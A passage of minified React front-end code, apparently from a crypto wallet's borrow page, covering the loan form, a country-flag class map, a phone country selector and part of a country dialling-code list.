                    className: Q5.walletInput,
                    onClick: () => F(!1)
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    selectedWallet: null != re ? re : void 0,
                    onChange: handleChangeWalletFrom,
                    wallets: U,
                    isNewSelector: !0,
                    isSelectorWithValue: !0,
                    newArrow: !0,
                    isBorrowWallets: !0,
                    customFilter: K,
                    inputWrapperClassName: Q5.inputWrapperClassName,
                    customWrapperList: Q5.wrapperList
                }))))
            }
            ))), O.createElement(MiniTabSelector, null, O.createElement("span", {
                onClick: handleSetMinAmount,
                className: Ht()(!fe && Q5.loading)
            }, fe ? "Min" : O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("span", {
                onClick: handleSetAllAmount
            }, "All")), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: se,
                rules: zf.wallet
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isNewDesign: !0,
                    message: a,
                    isInvalid: !t && b,
                    className: Q5.errorInput,
                    withOverflow: !0,
                    top: -60,
                    right: 24
                }, O.createElement(InputValueAndSelect_InputValueAndSelect, {
                    title: "I want to borrow",
                    value: (0,
                    Ko.yF)(null == f ? void 0 : f.amount_to),
                    fiat: se ? se.currency : void 0,
                    disabled: !0,
                    isLoading: !Boolean(null == f ? void 0 : f.amount_to),
                    isDashLoader: !0,
                    customWrapper: Q5.inputWrapper,
                    customWrapperCurrencies: Q5.customWrapperCurrencies
                }, O.createElement("div", {
                    className: Q5.walletInput,
                    onClick: () => F(!0)
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    selectedWallet: null != se ? se : void 0,
                    onChange: setWalletTo,
                    wallets: U,
                    withoutWatchOnly: !0,
                    customFilter: H,
                    isBorrowWallets: !0,
                    disabled: y || _,
                    isSelectFirstSubwallet: Ne,
                    isNewSelector: !0,
                    isSelectorWithValue: !0,
                    newArrow: !0,
                    newTokens: q,
                    newCoins: X,
                    inputWrapperClassName: Q5.inputWrapperClassName,
                    customWrapperList: Q5.wrapperList
                }))))
            }
            ))), O.createElement(BorrowLTV_BorrowLTV, {
                ltvList: t6,
                ltv: D,
                setLtv: M
            }), Te && O.createElement("div", null, O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, {
                className: Q5.infoText
            }, "Loan term ", O.createElement(tooltip, {
                classNameWrapper: Q5.tooltipInfo,
                text: we,
                width: "300px"
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Yx()
                },
                className: Q5.iconInfo
            }))), O.createElement(misk_info_modern_MiskInfoValue, {
                className: Q5.infoText
            }, O.createElement("span", null, "Unlimited"))), O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, {
                className: Q5.infoText
            }, "APR", O.createElement(tooltip, {
                classNameWrapper: Q5.tooltipInfo,
                text: ke,
                width: "300px"
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Yx()
                },
                className: Q5.iconInfo
            })), " :"), !f && O.createElement(misk_info_modern_MiskInfoValue, null, "–"), f && O.createElement(misk_info_modern_MiskInfoValue, null, O.createElement("b", {
                className: Q5.userSelect
            }, null == f ? void 0 : f.interest_percent, "% (", (0,
            Ko.yF)(null == f || null === (l = f.interest_amounts) || void 0 === l ? void 0 : l.year, o6.max)), " ", (0,
            be.xG)(null == se ? void 0 : se.currency), ")")), O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, null, "Price down limit ", O.createElement(tooltip, {
                classNameWrapper: Q5.tooltipInfo,
                text: Se,
                width: "300px"
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Yx()
                },
                className: Q5.iconInfo
            }))), !f && O.createElement(misk_info_modern_MiskInfoValue, {
                className: Q5.infoText
            }, "–"), f && O.createElement(misk_info_modern_MiskInfoValue, {
                className: Q5.infoText
            }, O.createElement("span", {
                className: Q5.userSelect
            }, (0,
            Ko.yF)(null == f ? void 0 : f.down_limit, o6.max)), (0,
            be.xG)(null == re ? void 0 : re.currency), "/", (0,
            be.xG)(null == se ? void 0 : se.currency))), O.createElement(misk_info_modern, null, O.createElement(misk_info_modern_MiskInfoTitle, null, "Additional fees ", O.createElement(tooltip, {
                classNameWrapper: Q5.tooltipInfo,
                text: Ce,
                width: "300px"
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Yx()
                },
                className: Q5.iconInfo
            }))), O.createElement(misk_info_modern_MiskInfoValue, {
                className: Q5.infoText
            }, "$0 for loans longer than 30 days, otherwise $", (0,
            Ko.eg)(I, 0) ? I : O.createElement(LoaderDots, {
                visible: !0
            }))), O.createElement("div", null, f && O.createElement(InterestRates_InterestRates, {
                estimate: f,
                currency: (null == se ? void 0 : se.currency) || "usdc",
                additionalFee: I || 0
            }))), O.createElement("div", {
                className: Q5.separatorButton
            }), O.createElement("div", {
                className: "clearfix"
            }), !c && i && O.createElement(ui_message, {
                type: "warning"
            }, "The operation is temporarily unavailable. Please try again later."), O.createElement("div", null, h && O.createElement(ui_message, {
                className: Ht()(Q5.message, Q5.messageInfo, Q5.messagePartnerError),
                type: "info"
            }, h), O.createElement("div", {
                className: X5.bottomButtomContainer
            }, y && !_ && O.createElement("div", null, O.createElement(loader, {
                visible: !0,
                width: 30
            })), !y && !_ && O.createElement("div", null, !h && O.createElement("p", {
                className: Ht()(X5.bottomInformation, Q5.additionalInfo)
            }, "Network fee excluded: ", ye ? (0,
            Ko.yF)(ce, r6.max) : O.createElement(LoaderDots, {
                visible: !0
            }), " ", (0,
            be.xG)(null == re ? void 0 : re.currency), O.createElement("span", null, "≈ ", ye && re ? (0,
            Ko.SJ)((0,
            Ko.yF)(J(null != ce ? ce : void 0, re, oe), l6.max), !0) : O.createElement(LoaderDots, {
                visible: !0
            }), " USD"))), _ && O.createElement(O.Fragment, null, O.createElement("div", null), O.createElement("div", {
                className: Q5.circleWrapper
            }, O.createElement(CircleLoader, {
                progress: 20 * S,
                size: 50,
                text: S
            }))), !_ && O.createElement(Yl, {
                className: Q5.bigButton,
                color: "blue",
                size: "large",
                radius: "large",
                onClick: handleCreateLoan,
                disabled: y || Boolean(h),
                id: "loanGetLoan"
            }, "Get loan"), _ && O.createElement(Yl, {
                size: "large",
                color: "blue",
                onClick: handleUndoExecution,
                radius: "large",
                className: Ht()(Q5.undoButton, Q5.bigButton),
                id: "loanGetLoanUndo"
            }, "Undo"))), O.createElement("div", {
                className: "clearfix"
            }))), O.createElement("div", {
                className: "col-xs-5"
            }, O.createElement(EChartProvider, null, O.createElement(EChart, {
                walletChartData: Ae,
                isSmallChart: !0
            }))), O.createElement("div", {
                className: "col-xs-5"
            }, O.createElement("div", {
                className: Ht()(X5.borrowBorderContainer, Q5.infoContainer)
            }, O.createElement("span", {
                className: Ht()(X5.description, Q5.description)
            }, "Use crypto as a collateral asset to recieve 50% of it in stablecoin."), O.createElement("ul", {
                className: Q5.ulElement
            }, O.createElement("li", null, "No credit checks. Borrow money without the traditional approval process."), O.createElement("li", null, "Top-tier security, Cold wallet storage."), O.createElement("li", null, "Receive 3-level notifications in case of the risk of the collateral liquidation."), O.createElement("li", null, "Service is provided by CoinRabbit.")), O.createElement("a", {
                target: "_blank",
                rel: "noopener noreferrer",
                href: "https://support.guarda.com/borrow/borrow-put-your-crypto-down-as-collateral-and-borrow-stablecoins",
                className: Q5.externalLink
            }, O.createElement("img", {
                src: Kq,
                alt: "Link",
                className: Q5.linkImage
            }), "Learn more in our Help Center"))), O.createElement(UserLoans_UserLoans, {
                onChange: handleSearch,
                value: m,
                sortedFilteredUserLoans: j,
                filteredUserLoans: z,
                loanCurrencies: G,
                isLoading: o
            }))
        }
          , P8 = "popup-edit-phone_popup_IjuFq"
          , L8 = "popup-edit-phone_header_38ycB"
          , F8 = "popup-edit-phone_headerTitle_2lf6c"
          , W8 = "popup-edit-phone_body_hweAl"
          , R8 = "popup-edit-phone_userContactData_3Vgks"
          , B8 = "popup-edit-phone_bottomButton_rB4kU"
          , O8 = "popup-edit-phone_phoneBlock_o3Zpa"
          , D8 = "popup-edit-phone_phoneInput_1YGdS"
          , M8 = "popup-edit-phone_inputError_12_BD"
          , U8 = "countries-dropdown-list_wrapper_gUJak inputs_wrapper_2IV3F"
          , G8 = "countries-dropdown-list_inputWrapper_3LbGc inputs_inputWrapper_k3xth"
          , V8 = "countries-dropdown-list_isOpen_1TpsK"
          , K8 = "countries-dropdown-list_placeholder_2VZ92"
          , H8 = "countries-dropdown-list_item_kD555"
          , z8 = "countries-dropdown-list_iconArrow_2X8uM inputs_iconArrow_2EDQu"
          , j8 = "countries-dropdown-list_wrapperList_3pIg2"
          , $8 = "countries-dropdown-list_countryBlock_1D0RR inputs_currencyBlock_2rgQZ"
          , Z8 = "countries-dropdown-list_emptyState_14Cul"
          , Y8 = "countries-dropdown-list_wrapImage_k5VoU"
          , q8 = "countries-dropdown-list_errorWrapper_2_qLY"
          , X8 = "countries-dropdown-list_visibleText_3Llqg"
          , Q8 = "countries-dropdown-list_loaderPlaceholder_9Nqoc"
          , J8 = "countries-dropdown-list_searchWrapper_1azIe"
          , e7 = "countries-dropdown-list_searchInput_343M6"
          , t7 = {
            flag: "icons-flags_flag_2k7BN",
            ad: "icons-flags_ad_3flxv",
            ae: "icons-flags_ae_tdka9",
            af: "icons-flags_af_2ixKN",
            ag: "icons-flags_ag_3qy-J",
            ai: "icons-flags_ai_2iMos",
            al: "icons-flags_al_30fTa",
            am: "icons-flags_am_2GWgA",
            an: "icons-flags_an_1CzlP",
            ao: "icons-flags_ao_2Dr5x",
            aq: "icons-flags_aq_3_niM",
            ar: "icons-flags_ar_1FL0c",
            as: "icons-flags_as_9dMmY",
            at: "icons-flags_at_3XRM5",
            au: "icons-flags_au_1yJpn",
            aw: "icons-flags_aw_1lRjB",
            ax: "icons-flags_ax__n0uh",
            az: "icons-flags_az_2bwTh",
            ba: "icons-flags_ba_22MfU",
            bb: "icons-flags_bb_3Xcip",
            bd: "icons-flags_bd_QFNT8",
            be: "icons-flags_be_15gho",
            bf: "icons-flags_bf_Ijyyx",
            bg: "icons-flags_bg_30t1F",
            bh: "icons-flags_bh_2R1Ef",
            bi: "icons-flags_bi_g1nW-",
            bj: "icons-flags_bj_rYXar",
            bl: "icons-flags_bl_2Teb6",
            bm: "icons-flags_bm_2gzJQ",
            bn: "icons-flags_bn_3f3_6",
            bo: "icons-flags_bo_2YOFx",
            br: "icons-flags_br_1MNyh",
            bs: "icons-flags_bs_xUaqH",
            bt: "icons-flags_bt_Q7V0h",
            bw: "icons-flags_bw_MUwma",
            by: "icons-flags_by_1rIj8",
            bz: "icons-flags_bz_3XYYX",
            ca: "icons-flags_ca_B0P2F",
            cc: "icons-flags_cc_1liFi",
            cd: "icons-flags_cd_2FrXb",
            cf: "icons-flags_cf_msT8D",
            cg: "icons-flags_cg_3WAYi",
            ch: "icons-flags_ch_3RiC4",
            ci: "icons-flags_ci_1ybNd",
            ck: "icons-flags_ck_qgM5c",
            cl: "icons-flags_cl_1Vgjz",
            cm: "icons-flags_cm_ueYEL",
            cn: "icons-flags_cn_1LYqt",
            co: "icons-flags_co_NEU6M",
            cr: "icons-flags_cr_1CyLw",
            cu: "icons-flags_cu_3eum1",
            cv: "icons-flags_cv_2ti1q",
            cw: "icons-flags_cw_1FRGz",
            cx: "icons-flags_cx_33SRD",
            cy: "icons-flags_cy_vVoOC",
            cz: "icons-flags_cz_xRJb0",
            de: "icons-flags_de_t6p4P",
            dj: "icons-flags_dj_2r0Eq",
            dk: "icons-flags_dk_1fyFf",
            dm: "icons-flags_dm_3VtAA",
            do: "icons-flags_do_32cuI",
            dz: "icons-flags_dz_1-Rdy",
            ec: "icons-flags_ec_1i44S",
            ee: "icons-flags_ee_1nRAk",
            eg: "icons-flags_eg_3EjUm",
            eh: "icons-flags_eh_15FKb",
            er: "icons-flags_er_1c5fb",
            es: "icons-flags_es_8bolh",
            et: "icons-flags_et_24MHD",
            eu: "icons-flags_eu_DErd1",
            fi: "icons-flags_fi_2C1bo",
            fj: "icons-flags_fj_1eyxb",
            fk: "icons-flags_fk_2LAZ8",
            fm: "icons-flags_fm_gDdWA",
            fo: "icons-flags_fo_3gEni",
            fr: "icons-flags_fr_u2zcT",
            ga: "icons-flags_ga_3V_mi",
            gb: "icons-flags_gb_3ihX6",
            gd: "icons-flags_gd_3qyv0",
            ge: "icons-flags_ge_3XHyu",
            gg: "icons-flags_gg_1Ggn_",
            gh: "icons-flags_gh_y_2P0",
            gi: "icons-flags_gi_1zX1m",
            gl: "icons-flags_gl_-q8Kh",
            gm: "icons-flags_gm_1iiZ0",
            gn: "icons-flags_gn_2eBXH",
            gq: "icons-flags_gq_27GNM",
            gr: "icons-flags_gr_y0DB1",
            gs: "icons-flags_gs_vQ_fB",
            gt: "icons-flags_gt_18UAg",
            gu: "icons-flags_gu_1DOZE",
            gw: "icons-flags_gw_3G1o1",
            gy: "icons-flags_gy_2hgMB",
            hk: "icons-flags_hk_1Rd85",
            hn: "icons-flags_hn_gfiQx",
            hr: "icons-flags_hr_14iy1",
            ht: "icons-flags_ht_KgaNi",
            hu: "icons-flags_hu_PRTk3",
            ic: "icons-flags_ic_1OvZH",
            id: "icons-flags_id_nN7uF",
            ie: "icons-flags_ie_3sP2_",
            il: "icons-flags_il_-u_1r",
            im: "icons-flags_im_1dLId",
            in: "icons-flags_in_CjJK9",
            iq: "icons-flags_iq_323Gv",
            ir: "icons-flags_ir_1h0dX",
            is: "icons-flags_is_16TDC",
            it: "icons-flags_it_3vWFP",
            je: "icons-flags_je_22TCh",
            jm: "icons-flags_jm_3U0kC",
            jo: "icons-flags_jo_ipSSK",
            jp: "icons-flags_jp_3R31R",
            ke: "icons-flags_ke_Dyq99",
            kg: "icons-flags_kg_3SARy",
            kh: "icons-flags_kh_3Gwc7",
            ki: "icons-flags_ki_1NhGQ",
            km: "icons-flags_km_216UF",
            kn: "icons-flags_kn_3rX3_",
            kp: "icons-flags_kp_271dJ",
            kr: "icons-flags_kr_2bs8V",
            kw: "icons-flags_kw_1QKsu",
            ky: "icons-flags_ky_385dD",
            kz: "icons-flags_kz_2L0ZU",
            la: "icons-flags_la_PXcyz",
            lb: "icons-flags_lb_2pSFl",
            lc: "icons-flags_lc_uilok",
            li: "icons-flags_li_2HQCn",
            lk: "icons-flags_lk_2Cicq",
            lr: "icons-flags_lr_3dKJu",
            ls: "icons-flags_ls_1Z1PF",
            lt: "icons-flags_lt_3Pu8v",
            lu: "icons-flags_lu_2YJCM",
            lv: "icons-flags_lv_3ETbP",
            ly: "icons-flags_ly_35pcW",
            ma: "icons-flags_ma_jT6Tp",
            mc: "icons-flags_mc_1P5dQ",
            md: "icons-flags_md_3tpYV",
            me: "icons-flags_me_2VcUx",
            mf: "icons-flags_mf_11sMe",
            mg: "icons-flags_mg_2aDry",
            mh: "icons-flags_mh_20Kl2",
            mk: "icons-flags_mk_1LTop",
            ml: "icons-flags_ml_2LzD6",
            mm: "icons-flags_mm_3kpvp",
            mn: "icons-flags_mn_1ZAfe",
            mo: "icons-flags_mo_w-m_B",
            mp: "icons-flags_mp_ztIUr",
            mq: "icons-flags_mq_3zqw-",
            mr: "icons-flags_mr_2S1rS",
            ms: "icons-flags_ms_2O6Ai",
            mt: "icons-flags_mt_3Y1o7",
            mu: "icons-flags_mu_3f7jA",
            mv: "icons-flags_mv_3Z-g-",
            mw: "icons-flags_mw_1tu95",
            mx: "icons-flags_mx_2iA_S",
            my: "icons-flags_my_1M9bO",
            mz: "icons-flags_mz_1DEoc",
            na: "icons-flags_na_zpE6I",
            nc: "icons-flags_nc_IbbgF",
            ne: "icons-flags_ne_g5vEm",
            nf: "icons-flags_nf_3jwAN",
            ng: "icons-flags_ng_zn5dr",
            ni: "icons-flags_ni_qeXqw",
            nl: "icons-flags_nl_3ZoME",
            no: "icons-flags_no_35awD",
            np: "icons-flags_np_2erqQ",
            nr: "icons-flags_nr_3nS1x",
            nu: "icons-flags_nu_3-eK6",
            nz: "icons-flags_nz_268AA",
            om: "icons-flags_om_2jo2R",
            pa: "icons-flags_pa_1woTM",
            pe: "icons-flags_pe_370NE",
            pf: "icons-flags_pf_AN4Se",
            pg: "icons-flags_pg_3coFp",
            ph: "icons-flags_ph_3r4uv",
            pk: "icons-flags_pk_3O0QI",
            pl: "icons-flags_pl_1YrRs",
            pn: "icons-flags_pn_1BQQg",
            pr: "icons-flags_pr_SsVCP",
            ps: "icons-flags_ps_2IZAU",
            pt: "icons-flags_pt_384tT",
            pw: "icons-flags_pw_24XzQ",
            py: "icons-flags_py_3dBeD",
            qa: "icons-flags_qa_2vVZZ",
            ro: "icons-flags_ro_1k2bT",
            rs: "icons-flags_rs_Z9vK4",
            ru: "icons-flags_ru_2cBum",
            rw: "icons-flags_rw_1cAbJ",
            sa: "icons-flags_sa_1JFWJ",
            sb: "icons-flags_sb_1rSix",
            sc: "icons-flags_sc_6W7Pa",
            sd: "icons-flags_sd_3ZUCg",
            se: "icons-flags_se_1XhLb",
            sg: "icons-flags_sg_180LQ",
            sh: "icons-flags_sh_NxR3V",
            si: "icons-flags_si_3SuIP",
            sk: "icons-flags_sk_3dPdx",
            sl: "icons-flags_sl_tpASj",
            sm: "icons-flags_sm_1Oo_k",
            sn: "icons-flags_sn_pbxW2",
            so: "icons-flags_so_ifd3H",
            sr: "icons-flags_sr_L0Njw",
            ss: "icons-flags_ss_z6VZA",
            st: "icons-flags_st_YabCW",
            sv: "icons-flags_sv_2FoBk",
            sy: "icons-flags_sy_FMNPy",
            sz: "icons-flags_sz_12gny",
            tc: "icons-flags_tc_1z5De",
            td: "icons-flags_td_1wR79",
            tf: "icons-flags_tf_21DdK",
            tg: "icons-flags_tg_2udVD",
            th: "icons-flags_th_eefsg",
            tj: "icons-flags_tj_198F8",
            tk: "icons-flags_tk_i_1sn",
            tl: "icons-flags_tl_3k5lz",
            tm: "icons-flags_tm_DJ7T_",
            tn: "icons-flags_tn_32aPN",
            to: "icons-flags_to_33R4x",
            tr: "icons-flags_tr_2AbZe",
            tt: "icons-flags_tt_t_zWE",
            tv: "icons-flags_tv_38wr6",
            tw: "icons-flags_tw_3HlDy",
            tz: "icons-flags_tz_2Dl66",
            ua: "icons-flags_ua_3gZJM",
            ug: "icons-flags_ug_1vZyM",
            us: "icons-flags_us_1hbhb",
            uy: "icons-flags_uy_2hE6z",
            uz: "icons-flags_uz_2FhHz",
            va: "icons-flags_va_2fHnN",
            vc: "icons-flags_vc_1pDf4",
            ve: "icons-flags_ve_1afIn",
            vg: "icons-flags_vg_37ZBx",
            vi: "icons-flags_vi_1eMec",
            vn: "icons-flags_vn_2wM6i",
            vu: "icons-flags_vu_3sY_Z",
            wf: "icons-flags_wf_2Zzow",
            ws: "icons-flags_ws_1ysT_",
            ye: "icons-flags_ye_PEwMa",
            za: "icons-flags_za_3zcAD",
            zm: "icons-flags_zm_1CNWl",
            zw: "icons-flags_zw_24w3E"
        };
        function IconFlag(e) {
            let {country: t} = e;
            return O.createElement("div", {
                className: Ht()(t7.flag, t7[t])
            })
        }
        IconFlag.propTypes = {
            country: as().string
        };
        function select_checkStr(e, t) {
            return null !== String(e).match(t)
        }
        const select_Select = e => {
            const [t,a] = (0,
            O.useState)(!1)
              , [n,r] = (0,
            O.useState)("");
            function handleSelect(t) {
                return function open() {
                    e.onChange(t);
                    a(!1);
                    r("")
                }
            }
            function handleOpen() {
                r("");
                a(!t)
            }
            const handleSearch = e => {
                let {target: {value: t}} = e;
                return r(t)
            }
              , getJSXWithItem = e => O.createElement(O.Fragment, null, O.createElement(IconFlag, {
                country: e.code
            }), O.createElement("div", {
                className: H8
            }, O.createElement("span", null, e.countryName), O.createElement("div", null, e.internationalDialCode)))
              , l = {
                [K8]: !e.selected,
                [V8]: t
            }
              , s = new RegExp(escape_search(n),"ig")
              , i = e.items.filter((e => !n || !" ".match(s) && select_checkStr(String(e.countryName) + String(e.internationalDialCode), s)));
            return O.createElement("div", {
                className: U8,
                tabIndex: 0,
                role: "button"
            }, O.createElement("div", {
                className: Ht()(G8, l),
                onClick: handleOpen
            }, Object.keys(e.selected).length ? O.createElement(IconFlag, {
                country: e.selected.code
            }) : O.createElement("span", null, e.placeholder), O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Gd()
                },
                className: z8
            })), O.createElement(Xl(), {
                visible: t,
                onClose: () => a(!1)
            }, O.createElement("div", {
                className: j8
            }, O.createElement("div", {
                className: J8
            }, O.createElement("input", {
                onChange: handleSearch,
                autoFocus: !0,
                placeholder: "Search...",
                type: "text",
                className: e7,
                spellCheck: "false",
                autoCorrect: "off",
                autoComplete: "off"
            })), i.map((e => O.createElement("div", {
                className: Ht()($8),
                onClick: handleSelect(e),
                key: `select-item${e.code}`
            }, getJSXWithItem(e)))), !i.length && O.createElement("div", {
                className: Z8
            }, e.emptyPlaceholder))))
        }
        ;
        select_Select.propTypes = {
            selected: as().object,
            onChange: as().func,
            items: as().array,
            maxHeight: as().number,
            emptyPlaceholder: as().string.isRequired,
            placeholder: as().string.isRequired
        };
        select_Select.defaultProps = {
            maxHeight: 350,
            isLoading: !1
        };
        const a7 = select_Select
          , n7 = undefined
          , r7 = [["Afghanistan", ["asia"], "af", "93"], ["Albania", ["europe"], "al", "355"], ["Algeria", ["africa", "north-africa"], "dz", "213"], ["Andorra", ["europe"], "ad", "376"], ["Angola", ["africa"], "ao", "244"], ["Antigua and Barbuda", ["america", "carribean"], "ag", "1268"], ["Argentina", ["america", "south-america"], "ar", "54", "(..) ........", 0, ["11", "221", "223", "261", "264", "2652", "280", "2905", "291", "2920", "2966", "299", "341", "342", "343", "351", "376", "379", "381", "3833", "385", "387", "388"]], ["Armenia", ["asia", "ex-ussr"], "am", "374"], ["Aruba", ["america", "carribean"], "aw", "297"], ["Australia", ["oceania"], "au", "61", "(..) .... ....", 0, ["2", "3", "4", "7", "8", "02", "03", "04", "07", "08"]], ["Austria", ["europe", "eu-union"], "at", "43"], ["Azerbaijan", ["asia", "ex-ussr"], "az", "994", "(..) ... .. .."], ["Bahamas", ["america", "carribean"], "bs", "1242"], ["Bahrain", ["middle-east"], "bh", "973"], ["Bangladesh", ["asia"], "bd", "880"], ["Barbados", ["america", "carribean"], "bb", "1246"], ["Belarus", ["europe", "ex-ussr"], "by", "375", "(..) ... .. .."], ["Belgium", ["europe", "eu-union"], "be", "32", "... .. .. .."], ["Belize", ["america", "central-america"], "bz", "501"], ["Benin", ["africa"], "bj", "229"], ["Bhutan", ["asia"], "bt", "975"], ["Bolivia", ["america", "south-america"], "bo", "591"], ["Bosnia and Herzegovina", ["europe", "ex-yugos"], "ba", "387"], ["Botswana", ["africa"], "bw", "267"], ["Brazil", ["america", "south-america"], "br", "55", "(..) ........."], ["British Indian Ocean Territory", ["asia"], "io", "246"], ["Brunei", ["asia"], "bn", "673"], ["Bulgaria", ["europe", "eu-union"], "bg", "359"], ["Burkina Faso", ["africa"], "bf", "226"], ["Burundi", ["africa"], "bi", "257"], ["Cambodia", ["asia"], "kh", "855"], ["Cameroon", ["africa"], "cm", "237"], ["Canada", ["america", "north-america"], "ca", "1", "(...) ...-....", 1, ["204", "226", "236", "249", "250", "289", "306", "343", "365", "387", "403", "416", "418", "431", "437", "438", "450", "506", "514", "519", "548", "579", "581", "587", "604", "613", "639", "647", "672", "705", "709", "742", "778", "780", "782", "807", "819", "825", "867", "873", "902", "905"]], ["Cape Verde", ["africa"], "cv", "238"], ["Caribbean Netherlands", ["america", "carribean"], "bq", "599", "", 1], ["Central African Republic", ["africa"], "cf", "236"], ["Chad", ["africa"], "td", "235"], ["Chile", ["america", "south-america"], "cl", "56"], ["China", ["asia"], "cn", "86", "..-........."], ["Colombia", ["america", "south-america"], "co", "57", "... ... ...."], ["Comoros", ["africa"], "km", "269"], ["Congo", ["africa"], "cd", "243"], ["Congo", ["africa"], "cg", "242"], ["Costa Rica", ["america", "central-america"], "cr", "506", "....-...."], ["Côte d’Ivoire", ["africa"], "ci", "225", ".. .. .. .."], ["Croatia", ["europe", "eu-union", "ex-yugos"], "hr", "385"], ["Cuba", ["america", "carribean"], "cu", "53"], ["Curaçao", ["america", "carribean"], "cw", "599", "", 0], ["Cyprus", ["europe", "eu-union"], "cy", "357", ".. ......"], ["Czech Republic", ["europe", "eu-union"], "cz", "420"], ["Denmark", ["europe", "eu-union", "baltic"], "dk", "45", ".. .. .. .."], ["Djibouti", ["africa"], "dj", "253"], ["Dominica", ["america", "carribean"], "dm", "1767"], ["Dominican Republic", ["america", "carribean"], "do", "1", "", 2, ["809", "829", "849"]], ["Ecuador", ["america", "south-america"], "ec", "593"], ["Egypt", ["africa", "north-africa"], "eg", "20"], ["El Salvador", ["america", "central-america"], "sv", "503", "....-...."], ["Equatorial Guinea", ["africa"], "gq", "240"], ["Eritrea", ["africa"], "er", "291"], ["Estonia", ["europe", "eu-union", "ex-ussr", "baltic"], "ee", "372", ".... ......"], ["Ethiopia", ["africa"], "et", "251"], ["Fiji", ["oceania"], "fj", "679"], ["Finland", ["europe", "eu-union", "baltic"], "fi", "358", ".. ... .. .."], ["France", ["europe", "eu-union"], "fr", "33", ". .. .. .. .."], ["French Guiana", ["america", "south-america"], "gf", "594"], ["French Polynesia", ["oceania"], "pf", "689"], ["Gabon", ["africa"], "ga", "241"], ["Gambia", ["africa"], "gm", "220"], ["Georgia", ["asia", "ex-ussr"], "ge", "995"], ["Germany", ["europe", "eu-union", "baltic"], "de", "49", ".... ........"], ["Ghana", ["africa"], "gh", "233"], ["Greece", ["europe", "eu-union"], "gr", "30"], ["Grenada", ["america", "carribean"], "gd", "1473"], ["Guadeloupe", ["america", "carribean"], "gp", "590", "", 0], ["Guam", ["oceania"], "gu", "1671"], ["Guatemala", ["america", "central-america"], "gt", "502", "....-...."], ["Guinea", ["africa"], "gn", "224"], ["Guinea-Bissau", ["africa"], "gw", "245"], ["Guyana", ["america", "south-america"], "gy", "592"], ["Haiti", ["america", "carribean"], "ht", "509", "....-...."], ["Honduras", ["america", "central-america"], "hn", "504"], ["Hong Kong", ["asia"], "hk", "852", ".... ...."], ["Hungary", ["europe", "eu-union"], "hu", "36"], ["Iceland", ["europe"], "is", "354", "... ...."], ["India", ["asia"], "in", "91", ".....-....."], ["Indonesia", ["asia"], "id", "62"], ["Iran", ["middle-east"], "ir", "98", "... ... ...."], ["Iraq", ["middle-east"], "iq", "964"], ["Ireland", ["europe", "eu-union"], "ie", "353", ".. ......."], ["Israel", ["middle-east"], "il", "972", "... ... ...."], ["Italy", ["europe", "eu-union"], "it", "39", "... .......", 0], ["Jamaica", ["america", "carribean"], "jm", "1876"], ["Japan", ["asia"], "jp", "81", ".. .... ...."], ["Jordan", ["middle-east"], "jo", "962"], ["Kazakhstan", ["asia", "ex-ussr"], "kz", "7", "... ...-..-..", 1, ["310", "311", "312", "313", "315", "318", "321", "324", "325", "326", "327", "336", "7172", "73622"]], ["Kenya", ["africa"], "ke", "254"], ["Kiribati", ["oceania"], "ki", "686"], ["Kosovo", ["europe", "ex-yugos"], "xk", "383"], ["Kuwait", ["middle-east"], "kw", "965"], ["Kyrgyzstan", ["asia", "ex-ussr"], "kg", "996"], ["Laos", ["asia"], "la", "856"], ["Latvia", ["europe", "eu-union", "ex-ussr", "baltic"], "lv", "371"], ["Lebanon", ["middle-east"], "lb", "961"], ["Lesotho", ["africa"], "ls", "266"], ["Liberia", ["africa"], "lr", "231"], ["Libya", ["africa", "north-africa"], "ly", "218"], ["Liechtenstein", ["europe"], "li", "423"], ["Lithuania", ["europe", "eu-union", "ex-ussr", "baltic"], "lt", "370"], ["Luxembourg", ["europe", "eu-union"], "lu", "352"], ["Macau", ["asia"], "mo", "853"], ["Macedonia", ["europe", "ex-yugos"], "mk", "389"], ["Madagascar", ["africa"], "mg", "261"], ["Malawi", ["africa"], "mw", "265"], ["Malaysia", ["asia"], "my", "60", "..-....-...."], ["Maldives", ["asia"], "mv", "960"], ["Mali", ["africa"], "ml", "223"], ["Malta", ["europe", "eu-union"], "mt", "356"], ["Marshall Islands", ["oceania"], "mh", "692"], ["Martinique", ["america", "carribean"], "mq", "596"], ["Mauritania", ["africa"], "mr", "222"], ["Mauritius", ["africa"], "mu", "230"], ["Mexico", ["america", "central-america"], "mx", "52", "... ... ....", 0, ["55", "81", "33", "656", "664", "998", "774", "229"]], ["Micronesia", ["oceania"], "fm", "691"], ["Moldova", ["europe"], "md", "373", "(..) ..-..-.."], ["Monaco", ["europe"], "mc", "377"], ["Mongolia", ["asia"], "mn", "976"], ["Montenegro", ["europe", "ex-yugos"], "me", "382"], ["Morocco", ["africa", "north-africa"], "ma", "212"], ["Mozambique", ["africa"], "mz", "258"], ["Myanmar", ["asia"], "mm", "95"], ["Namibia", ["africa"], "na", "264"], ["Nauru", ["africa"], "nr", "674"], ["Nepal", ["asia"], "np", "977"], ["Netherlands", ["europe", "eu-union"], "nl", "31", ".. ........"], ["New Caledonia", ["oceania"], "nc", "687"], ["New Zealand", ["oceania"], "nz", "64", "...-...-...."], ["Nicaragua", ["america", "central-america"], "ni", "505"], ["Niger", ["africa"], "ne", "227"], ["Nigeria", ["africa"], "ng", "234"], ["North Korea", ["asia"], "kp", "850"], ["Norway", ["europe", "baltic"], "no", "47", "... .. ..."], ["Oman", ["middle-east"], "om", "968"], ["Pakistan", ["asia"], "pk", "92", "...-......."], ["Palau", ["oceania"], "pw", "680"], ["Palestine", ["middle-east"], "ps", "970"], ["Panama", ["america", "central-america"], "pa", "507"], ["Papua New Guinea", ["oceania"], "pg", "675"], ["Paraguay", ["america", "south-america"], "py", "595"], ["Peru", ["america", "south-america"], "pe", "51"], ["Philippines", ["asia"], "ph", "63", ".... ......."], ["Poland", ["europe", 